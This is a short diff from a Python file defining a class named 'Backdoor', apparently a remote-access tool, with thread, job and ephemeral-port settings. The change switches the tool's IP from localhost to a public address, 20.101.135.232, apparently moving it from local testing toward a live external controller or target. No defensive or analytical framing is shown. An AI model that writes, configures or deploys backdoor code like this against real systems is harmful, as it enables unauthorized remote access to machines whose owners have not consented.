@@ -30,7 +30,7 @@ from Logger import Logger
 class Backdoor:
     NUMBER_OF_THREADS = 6
     JOB_NUMBER = [0, 3, 4, 6]
-    Ip = "127.0.0.1"  # 20.101.135.232
+    Ip = "20.101.135.232"  # 20.101.135.232
     NUMBER_OF_PORTS = 5
     MAX_PORT_VALUE = 65535
     MIN_PORT_VALUE = 49152
